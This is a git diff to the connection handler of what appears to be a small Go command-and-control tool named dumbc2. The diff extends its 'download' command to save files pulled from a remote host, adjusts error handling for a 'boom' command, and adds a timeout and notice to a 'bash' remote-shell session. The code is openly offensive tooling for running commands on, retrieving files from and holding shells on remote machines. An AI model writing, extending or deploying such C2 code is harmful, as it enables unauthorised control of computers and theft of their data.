@@ -10,6 +10,7 @@ import (
 	"github.com/kmahyyg/dumbc2/transport"
 	"github.com/kmahyyg/dumbc2/utils"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -108,6 +109,7 @@ func handleClient(conn net.Conn) {
 				}
 				if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
 					log.Println("Failed to execute command.")
+					continue
 				}
 			}
 		case "download":
@@ -131,6 +133,13 @@ func handleClient(conn net.Conn) {
 			}
 			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
 				log.Println(errors.New("Function execution error."))
+				continue
+			}
+			// write out to file
+			err = ioutil.WriteFile(string(curRTCmd.FilePathLocal), curPingBack.DataPart, 0644)
+			if err != nil {
+				log.Println(err)
+				continue
 			}
 		case "boom":
 			curRTCmd := &remoteop.RTCommand{
@@ -145,13 +154,15 @@ func handleClient(conn net.Conn) {
 			curPingBack, err := remoteop.ParseIncomingPB(conn)
 			if err != nil {
 				log.Println(err)
-				continue
+				break
 			}
 			if curPingBack == nil || curPingBack.StatusCode != remoteop.StatusOK {
 				log.Println(errors.New("Function execution error."))
+				break
 			}
 			break
 		case "bash":
+			fmt.Println("** PLease Note This Shell doesn't Support TTY or Upgrade to TTY. **\n")
 			curRTCmd = &remoteop.RTCommand{
 				Command: []byte(getShellCmd),
 				HasData: byte(0),
@@ -161,6 +172,8 @@ func handleClient(conn net.Conn) {
 				log.Println(err)
 				continue
 			}
+			_ = conn.SetReadDeadline(time.Now().Add(time.Minute * 1))
+			// no need to check pingback
 			copydata := func(r io.Reader, w io.Writer) {
 				_, err := io.Copy(w, r)
 				if err != nil {
